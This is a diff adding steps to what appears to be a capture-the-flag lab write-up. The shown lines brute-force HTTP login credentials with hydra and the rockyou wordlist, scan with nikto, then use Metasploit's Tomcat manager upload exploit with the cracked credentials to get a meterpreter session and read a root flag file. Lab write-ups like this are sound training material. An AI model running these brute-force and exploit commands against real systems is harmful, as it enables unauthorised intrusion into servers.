@@ -28,3 +28,31 @@ hydra -l bob -P /usr/share/wordlists/rockyou.txt $IP http-get /protected
 
 ```
 > bob : bubbles
+
+#USING NIKTO ON /MANAGER/HTML
+
+>Documentation files found : 5
+
+#EXPLOIT
+
+>Fire up msfconsol
+
+```
+msfconsole
+use exploit/multi/http/tomcat_mgr_upload
+set RHOSTS $IP
+set HttpPassword bubbles
+set HttpUsername bob
+set RPORT 1234
+run
+
+```
+
+>After getting a meterpreter
+
+```
+cd /root/
+ls
+cat flag.txt
+
+```
